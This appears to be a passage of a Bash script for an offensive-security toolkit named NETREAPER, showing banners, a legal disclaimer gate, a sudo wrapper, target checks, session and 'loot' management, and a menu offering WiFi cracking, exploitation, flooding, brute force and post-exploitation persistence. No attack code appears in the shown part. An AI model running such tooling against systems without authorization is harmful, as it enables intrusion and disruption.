    â•‘                                                                           â•‘
    â•‘  â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â•‘
    â•‘  â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â•šâ•â•â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•— â•‘
    â•‘  â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—     â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â•‘
    â•‘  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•     â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â• â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•— â•‘
    â•‘  â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘ â•‘
    â•‘  â•šâ•â•  â•šâ•â•â•â•â•šâ•â•â•â•â•â•â•   â•šâ•â•   â•šâ•â•  â•šâ•â•â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•â•šâ•â•     â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â• â•‘
    â•‘                                                                           â•‘
    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
BANNER
    echo -e "${C_RESET}"
    echo
    echo -e "    ${C_BORDER}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${C_RESET}"
    echo -e "    ${C_SHADOW}â•‘${C_RESET} ${C_RED}\"Some tools scan.${C_RESET} ${C_CYAN}Some tools attack.${C_RESET} ${C_GREEN}I do both.\"${C_RESET}               ${C_SHADOW}â•‘${C_RESET}"
    echo -e "    ${C_BORDER}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${C_RESET}"
    echo -e "                   ${C_SHADOW}[${C_RESET} ${C_RED}v${VERSION}${C_RESET} ${C_SHADOW}â€¢${C_RESET} ${C_CYAN}${CODENAME}${C_RESET} ${C_SHADOW}â€¢${C_RESET} ${C_GREEN}70+ Tools${C_RESET} ${C_SHADOW}]${C_RESET}"
    echo
}

show_mini_banner() {
    echo -e "${C_BLOOD}    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${C_RESET}"
    echo -e "${C_BLOOD}    â•‘${C_RESET}  ${C_SKULL}NETREAPER${C_RESET} ${C_SHADOW}v${VERSION}${C_RESET}                                              ${C_BLOOD}â•‘${C_RESET}"
    echo -e "${C_BLOOD}    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${C_RESET}"
}

#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# LEGAL DISCLAIMER
#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

show_skull() {
    echo -e "${C_BLOOD}"
    cat << 'SKULL'
                              ______
                           .-"      "-.
                          /            \
                         |              |
                         |,  .-.  .-.  ,|
                         | )(_o/  \o_)( |
                         |/     /\     \|
                         (_     ^^     _)
                          \__|IIIIII|__/
                           | \IIIIII/ |
                           \          /
                            `--------`
SKULL
    echo -e "${C_RESET}"
}

show_legal() {
    show_skull
    echo -e "${C_BLOOD}${C_BOLD}"
    echo "    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—"
    echo "    â•‘                     âš   LEGAL DISCLAIMER  âš                         â•‘"
    echo "    â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£"
    echo "    â•‘                                                                   â•‘"
    echo "    â•‘  This tool is for AUTHORIZED PENETRATION TESTING ONLY.            â•‘"
    echo "    â•‘                                                                   â•‘"
    echo "    â•‘  By proceeding, you confirm:                                      â•‘"
    echo "    â•‘  â€¢ You have WRITTEN authorization to test target systems          â•‘"
    echo "    â•‘  â€¢ You accept FULL legal responsibility for your actions          â•‘"
    echo "    â•‘  â€¢ You understand unauthorized access is a FEDERAL CRIME          â•‘"
    echo "    â•‘  â€¢ The authors accept NO LIABILITY for misuse                     â•‘"
    echo "    â•‘                                                                   â•‘"
    echo "    â•‘  CFAA violations: Up to 20 years imprisonment                     â•‘"
    echo "    â•‘                                                                   â•‘"
    echo "    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
    echo -e "${C_RESET}"
    echo
    echo -ne "    ${C_FIRE}Type '${C_VENOM}I ACCEPT${C_FIRE}' to proceed (case sensitive): ${C_RESET}"
}

check_legal() {
    [[ -f "$LEGAL_FILE" ]] && return 0
    
    clear
    show_legal
    read -r response
    
    if [[ "$response" == "I ACCEPT" ]]; then
        mkdir -p "$(dirname "$LEGAL_FILE")"
        echo "$(date -Iseconds) | $(whoami)@$(hostname) | Accepted" > "$LEGAL_FILE"
        echo
        typewriter "    Access granted. The reaper awakens." 0.02
        sleep 1
        return 0
    else
        echo -e "\n    ${C_BLOOD}Access denied. Come back when you're ready.${C_RESET}\n"
        exit 1
    fi
}

#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# UTILITIES
#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

is_root() {
    [[ $EUID -eq 0 ]]
}

run_with_sudo() {
    local func_name="${1:-}"
    shift || true

    if [[ -z "$func_name" ]]; then
        log_error "No function specified for sudo wrapper"
        return 1
    fi

    if is_root; then
        "$func_name" "$@"
        return $?
    fi

    log_warning "This operation requires root privileges"
    echo -ne "    ${C_PROMPT}Run with sudo? [Y/n]: ${C_RESET}"
    read -r confirm
    if [[ "${confirm,,}" == "n" ]]; then
        log_info "Operation cancelled"
        return 1
    fi

    local args_quoted
    args_quoted=$(printf ' %q' "$@")

    local env_decls=""
    local vars_to_export=(TARGET OUTPUT_FILE LOG_DIR OUTPUT_DIR LOOT_DIR CONFIG_DIR CONFIG_FILE BASE_LOG_DIR BASE_OUTPUT_DIR BASE_LOOT_DIR SESSION_NAME CURRENT_SESSION DEFAULT_INTERFACE DEFAULT_WORDLIST TMP_DIR QUIET JSON_OUTPUT NO_COLOR C_RESET C_BOLD C_DIM C_RED C_BLOOD C_FIRE C_BLUE C_CYAN C_STEEL C_GREEN C_YELLOW C_PURPLE C_ORANGE C_BORDER C_SHADOW C_GHOST C_WHITE C_SUCCESS C_ERROR C_WARNING C_INFO C_PROMPT C_VENOM C_SKULL C_GOLD)
    for var in "${vars_to_export[@]}"; do
        if declare -p "$var" &>/dev/null; then
            env_decls+=$(declare -p "$var")
            env_decls+=$'\n'
        fi
    done

    sudo -E bash -c "$(declare -f); ${env_decls}set -uo pipefail; ${func_name}${args_quoted}"
}

require_root() {
    if is_root; then
        return 0
    fi

    log_error "This operation requires root privileges"
    echo -ne "    ${C_PROMPT}Elevate with sudo? [Y/n]: ${C_RESET}"
    read -r confirm
    if [[ "${confirm,,}" != "n" ]]; then
        log_info "Re-run with sudo to continue."
    else
        log_info "Operation cancelled"
    fi
    return 1
}

check_tool() {
    local tool="${1:-}"
    [[ -z "$tool" ]] && return 1
    if command -v "$tool" &>/dev/null; then
        return 0
    else
        log_warning "Tool not found: $tool"
        echo -e "    ${C_SHADOW}Install: sudo apt install $tool${C_RESET}"
        return 1
    fi
}

is_private_ip() {
    local ip="${1:-}"
    [[ -z "$ip" ]] && return 1
    [[ "$ip" =~ ^10\. ]] && return 0
    [[ "$ip" =~ ^172\.(1[6-9]|2[0-9]|3[01])\. ]] && return 0
    [[ "$ip" =~ ^192\.168\. ]] && return 0
    [[ "$ip" =~ ^127\. ]] && return 0
    return 1
}

validate_target() {
    local target="${1:-}"
    
    [[ -z "$target" ]] && { log_error "No target specified"; return 1; }
    
    # Block .gov and .mil
    if [[ "$target" =~ \.(gov|mil)$ ]] || [[ "$target" =~ \.(gov|mil)/ ]]; then
        log_error "Targeting government/military domains is prohibited"
        return 1
    fi
    
    # Warn on external targets
    if ! is_private_ip "$target" && [[ ! "$target" =~ ^(localhost|127\.) ]]; then
        echo
        echo -e "    ${C_FIRE}âš   EXTERNAL TARGET DETECTED${C_RESET}"
        log_target "$target"
        echo -ne "    ${C_GHOST}Do you have written authorization? [yes/no]: ${C_RESET}"
        read -r confirm
        [[ "${confirm,,}" == "yes" ]] || return 1
    fi
    
    return 0
}

get_target() {
    echo
    echo -ne "    ${C_FIRE}â— TARGET: ${C_RESET}"
    read -r TARGET
    
    [[ -z "$TARGET" ]] && { log_error "No target specified"; return 1; }
    TARGET="$(resolve_target_alias "$TARGET")"
    validate_target "$TARGET" || return 1
    record_history "$TARGET"
    
    # Create output file path
    local safe_target="${TARGET//[^a-zA-Z0-9._-]/_}"
    OUTPUT_FILE="${OUTPUT_DIR}/${safe_target}_$(date +%Y%m%d_%H%M%S)"
    
    return 0
}

get_interface() {
    echo
    echo -e "    ${C_GHOST}Available interfaces:${C_RESET}"
    ip -o link show | awk -F': ' '{print "      " $2}' | grep -v "^lo$"
    echo
    echo -ne "    ${C_FIRE}â— INTERFACE [${DEFAULT_INTERFACE}]: ${C_RESET}"
    read -r IFACE
    IFACE="${IFACE:-$DEFAULT_INTERFACE}"
    
    [[ -z "$IFACE" ]] && { log_error "No interface specified"; return 1; }
    ip link show "$IFACE" &>/dev/null || { log_error "Interface not found: $IFACE"; return 1; }
    
    return 0
}

pause() {
    echo
    echo -ne "    ${C_SHADOW}Press Enter to continue...${C_RESET}"
    read -r
}

#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# SESSION MANAGEMENT
#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

set_session_paths() {
    local session_path="${1:-}"
    mkdir -p "$session_path" "$session_path/scans" "$session_path/loot" "$session_path/logs" "$session_path/notes"
    OUTPUT_DIR="${session_path}/scans"
    LOOT_DIR="${session_path}/loot"
    LOG_DIR="${session_path}/logs"
    CURRENT_SESSION="$session_path"
    SESSION_NAME="$(basename "$session_path")"
}

# shellcheck disable=SC2120
session_start() {
    local provided_name="${1:-}" provided_scope="${2:-}"
    operation_header "Session start" "${provided_name:-auto}"
    local start_ms
    start_ms=$(start_timer_ms)
    if [[ -z "$provided_name" ]]; then
        echo -ne "    ${C_GHOST}Session name [engagement_$(date +%Y%m%d_%H%M)]: ${C_RESET}"
        read -r provided_name
    fi
    local name="${provided_name:-engagement_$(date +%Y%m%d_%H%M)}"
    local session_path="${SESSIONS_DIR}/${name}"
    if [[ -d "$session_path" ]]; then
        log_warning "Session already exists: $name"
    fi
    mkdir -p "$SESSIONS_DIR"
    set_session_paths "$session_path"
    local scope="$provided_scope"
    if [[ -z "$scope" ]]; then
        echo -ne "    ${C_GHOST}Target scope/notes: ${C_RESET}"
        read -r scope
    fi
    local meta_file="${session_path}/session.meta"
    {
        echo "name=$name"
        echo "created=$(date -Iseconds)"
        echo "scope=$scope"
        echo "operator=$(whoami)@$(hostname)"
    } > "$meta_file"
    echo "$name" > "$SESSION_FILE"
    log_success "Session started: $name"
    log_info "Output: $OUTPUT_DIR | Loot: $LOOT_DIR"
    operation_summary "Session start" "$start_ms" "$meta_file"
}

# shellcheck disable=SC2120
session_resume() {
    operation_header "Session resume" "request"
    local start_ms
    start_ms=$(start_timer_ms)
    if [[ ! -d "$SESSIONS_DIR" ]] || [[ -z "$(ls -A "$SESSIONS_DIR" 2>/dev/null)" ]]; then
        log_warning "No sessions to resume"
        return 1
    fi

    local selection name_input="${1:-}"
    if [[ -n "$name_input" ]] && [[ -d "${SESSIONS_DIR}/${name_input}" ]]; then
        selection=manual
    else
        echo -e "    ${C_GHOST}Available sessions:${C_RESET}"
        local idx=1
        local sessions=()
        while IFS= read -r session_dir; do
            sessions+=("$session_dir")
            printf "    ${C_GHOST}[%d]${C_RESET} %s\n" "$idx" "$(basename "$session_dir")"
            idx=$((idx + 1))
        done < <(find "$SESSIONS_DIR" -maxdepth 1 -mindepth 1 -type d | sort)

        echo
        echo -ne "    ${C_FIRE}â–¶ ${C_RESET}"
        read -r selection

        if [[ -z "$selection" ]] || ! [[ "$selection" =~ ^[0-9]+$ ]]; then
            log_error "Invalid selection"
            return 1
        fi

        local index=$((selection - 1))
        if (( index < 0 || index >= ${#sessions[@]} )); then
            log_error "Selection out of range"
            return 1
        fi

        local chosen="${sessions[$index]}"
        set_session_paths "$chosen"
        echo "$SESSION_NAME" > "$SESSION_FILE"
        log_success "Resumed session: $SESSION_NAME"
        operation_summary "Session resume" "$start_ms" "$SESSION_NAME"
        return 0
    fi

    if [[ "$selection" == "manual" ]]; then
        set_session_paths "${SESSIONS_DIR}/${name_input}"
        echo "$SESSION_NAME" > "$SESSION_FILE"
        log_success "Resumed session: $SESSION_NAME"
    fi
    operation_summary "Session resume" "$start_ms" "$SESSION_NAME"
}

session_status() {
    operation_header "Session status" "$SESSION_NAME"
    local start_ms
    start_ms=$(start_timer_ms)
    if [[ -z "$CURRENT_SESSION" ]]; then
        log_info "No active session"
        return
    fi

    local meta_file="${CURRENT_SESSION}/session.meta"
    local created scope
    if [[ -f "$meta_file" ]]; then
        # shellcheck disable=SC1090
        source "$meta_file"
        created="${created:-$(date -Iseconds)}"
        scope="${scope:-}"
    else
        created="$(date -Iseconds)"
        scope=""
    fi

    local elapsed created_epoch
    created_epoch=$(date -d "$created" +%s 2>/dev/null || date +%s)
    elapsed=$(( ( $(date +%s) - created_epoch ) / 60 ))
    echo
    echo -e "    ${C_SKULL}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${C_RESET}"
    echo -e "    ${C_SKULL}â•‘${C_RESET}                   ${C_FIRE}SESSION STATUS${C_RESET}                        ${C_SKULL}â•‘${C_RESET}"
    echo -e "    ${C_SKULL}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${C_RESET}"
    echo
    echo -e "    ${C_GHOST}Name:${C_RESET} ${SESSION_NAME}"
    echo -e "    ${C_GHOST}Started:${C_RESET} ${created}"
    [[ -n "$scope" ]] && echo -e "    ${C_GHOST}Scope:${C_RESET} ${scope}"
    echo -e "    ${C_GHOST}Elapsed:${C_RESET} ${elapsed} minutes"
    echo -e "    ${C_GHOST}Scans:${C_RESET} $(find "$CURRENT_SESSION/scans" -type f 2>/dev/null | wc -l)"
    echo -e "    ${C_GHOST}Loot:${C_RESET} $(find "$CURRENT_SESSION/loot" -type f 2>/dev/null | wc -l)"
    echo -e "    ${C_GHOST}Logs:${C_RESET} $(find "$CURRENT_SESSION/logs" -type f 2>/dev/null | wc -l)"
    echo -e "    ${C_GHOST}Notes:${C_RESET} $(find "$CURRENT_SESSION/notes" -type f 2>/dev/null | wc -l)"
    operation_summary "Session status" "$start_ms" "$CURRENT_SESSION"
}

session_export() {
    if [[ -z "$CURRENT_SESSION" ]]; then
        log_error "No active session to export"
        return 1
    fi
    operation_header "Session export" "$SESSION_NAME"
    local start_ms
    start_ms=$(start_timer_ms)
    local meta_file="${CURRENT_SESSION}/session.meta"
    local scope=""
    if [[ -f "$meta_file" ]]; then
        # shellcheck disable=SC1090
        source "$meta_file"
        scope="${scope:-}"
    fi
    local dest_default="${HOME}/Desktop/${SESSION_NAME}_session.zip"
    echo -ne "    ${C_GHOST}Export zip path [${dest_default}]: ${C_RESET}"
    read -r dest
    dest="${dest:-$dest_default}"

    if ! command -v zip &>/dev/null; then
        log_error "zip not installed"
        return 1
    fi

    local summary="${CURRENT_SESSION}/session_summary.txt"
    {
        echo "Session: ${SESSION_NAME}"
        echo "Exported: $(date -Iseconds)"
        echo "Scope: ${scope:-}" 
        echo "Files:"
        find "$CURRENT_SESSION" -maxdepth 2 -type f -printf '%P\n' 2>/dev/null
    } > "$summary"

    (cd "$CURRENT_SESSION/.." && zip -r "$dest" "$SESSION_NAME" >/dev/null)
    log_loot "Session exported to $dest"
    operation_summary "Session export" "$start_ms" "$dest"
}

session_notes() {
    if [[ -z "$CURRENT_SESSION" ]]; then
        log_error "Start or resume a session first"
        return 1
    fi
    local notes_file="${CURRENT_SESSION}/notes/notes.md"
    mkdir -p "${CURRENT_SESSION}/notes"
    local editor="${EDITOR:-nano}"
    operation_header "Session notes" "$SESSION_NAME"
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "$editor ${notes_file}"
    "$editor" "$notes_file"
    operation_summary "Session notes" "$start_ms" "$notes_file"
}

session_list() {
    operation_header "Session list" "all"
    local start_ms
    start_ms=$(start_timer_ms)
    if [[ ! -d "$SESSIONS_DIR" ]] || [[ -z "$(ls -A "$SESSIONS_DIR" 2>/dev/null)" ]]; then
        log_warning "No sessions found"
        return
    fi
    echo
    echo -e "    ${C_GHOST}All sessions:${C_RESET}"
    find "$SESSIONS_DIR" -maxdepth 1 -mindepth 1 -type d -printf '    %f\n' | sort
    operation_summary "Session list" "$start_ms" "$SESSIONS_DIR"
}

exit_gracefully() {
    echo
    typewriter "    The reaper sleeps... for now." 0.02
    echo
    exit 0
}

#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MAIN MENU
#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

main_menu() {
    while true; do
        show_banner
        
        echo -e "    ${C_BORDER}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${C_RESET}"
        echo -e "    ${C_BORDER}â•‘${C_RESET}                         ${C_FIRE}â—¤ ARSENAL â—¢${C_RESET}                              ${C_BORDER}â•‘${C_RESET}"
        echo -e "    ${C_BORDER}â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£${C_RESET}"
        echo -e "    ${C_BORDER}â•‘${C_RESET}                                                                   ${C_BORDER}â•‘${C_RESET}"
        echo -e "    ${C_BORDER}â•‘${C_RESET}   ${C_CYAN}[1]${C_RESET} ${C_BLUE}ğŸ” RECON${C_RESET}           Scanning, discovery, enumeration        ${C_BORDER}â•‘${C_RESET}"
        echo -e "    ${C_BORDER}â•‘${C_RESET}   ${C_CYAN}[2]${C_RESET} ${C_GREEN}ğŸ“¡ WIRELESS${C_RESET}        WiFi attacks, monitoring, cracking       ${C_BORDER}â•‘${C_RESET}"
        echo -e "    ${C_BORDER}â•‘${C_RESET}   ${C_CYAN}[3]${C_RESET} ${C_RED}ğŸ’€ EXPLOIT${C_RESET}         Web attacks, SQLi, Metasploit            ${C_BORDER}â•‘${C_RESET}"
        echo -e "    ${C_BORDER}â•‘${C_RESET}   ${C_CYAN}[4]${C_RESET} ${C_ORANGE}ğŸ”¥ STRESS${C_RESET}          Bandwidth, flooding, load testing        ${C_BORDER}â•‘${C_RESET}"
        echo -e "    ${C_BORDER}â•‘${C_RESET}   ${C_CYAN}[5]${C_RESET} ${C_PURPLE}ğŸ”§ TOOLS${C_RESET}           Install arsenal, status, config          ${C_BORDER}â•‘${C_RESET}"
        echo -e "    ${C_BORDER}â•‘${C_RESET}   ${C_CYAN}[6]${C_RESET} ${C_SHADOW}ğŸ“Š INTEL${C_RESET}           OSINT, traffic capture, reporting        ${C_BORDER}â•‘${C_RESET}"
        echo -e "    ${C_BORDER}â•‘${C_RESET}   ${C_CYAN}[7]${C_RESET} ${C_YELLOW}ğŸ”‘ CREDENTIALS${C_RESET}     Hash cracking, brute force               ${C_BORDER}â•‘${C_RESET}"
        echo -e "    ${C_BORDER}â•‘${C_RESET}   ${C_CYAN}[8]${C_RESET} ${C_RED}ğŸ¯ POST-EXPLOIT${C_RESET}    Lateral movement, persistence            ${C_BORDER}â•‘${C_RESET}"
        echo -e "    ${C_BORDER}â•‘${C_RESET}                                                                   ${C_BORDER}â•‘${C_RESET}"
        echo -e "    ${C_BORDER}â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£${C_RESET}"
        echo -e "    ${C_BORDER}â•‘${C_RESET}   ${C_GHOST}[S]${C_RESET} Sessions    ${C_GHOST}[C]${C_RESET} Config    ${C_GHOST}[H]${C_RESET} Help    ${C_RED}[Q]${C_RESET} Quit             ${C_BORDER}â•‘${C_RESET}"
        echo -e "    ${C_BORDER}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${C_RESET}"
        echo
        echo -ne "    ${C_CYAN}â–¶${C_RESET} "
        read -r choice
        
        case "$choice" in
            1)      menu_recon ;;
            2)      menu_wireless ;;
            3)      menu_exploit ;;
            4)      menu_stress ;;
            5)      menu_tools ;;
            6)      menu_intel ;;
            7)      menu_credentials ;;
            8)      menu_postexploit ;;
            s|S)    menu_session ;;
            c|C)    cmd_config edit ;;
            h|H)    show_help; read -r ;;
            q|Q)    exit_gracefully ;;
            *)      log_error "Invalid option" ;;
        esac
    done
}


#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# SUBMENUS
#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

cmd_network_discovery() {
    get_target || return 1
    run_netdiscover
}

cmd_dns_enum() {
    get_target || return 1
    run_dnsenum
}

cmd_ssl_analysis() {
    get_target || return 1
    run_sslscan
}

cmd_monitor_mode_enable() {
    cmd_monitor_mode "enable"
}

cmd_monitor_mode_disable() {
    cmd_monitor_mode "disable"
}

cmd_crack_handshake() {
    menu_wifi_crack
}

cmd_convert_handshake() {
    cmd_convert_hashcat
}

menu_recon() {
    while true; do
        clear
        echo -e "${C_CYAN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${C_RESET}"
        echo -e "${C_CYAN}â•‘${C_RESET}                    ${C_FIRE}âš” RECON ARSENAL âš”${C_RESET}                           ${C_CYAN}â•‘${C_RESET}"
        echo -e "${C_CYAN}â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£${C_RESET}"
        echo -e "${C_CYAN}â•‘${C_RESET}                                                                   ${C_CYAN}â•‘${C_RESET}"
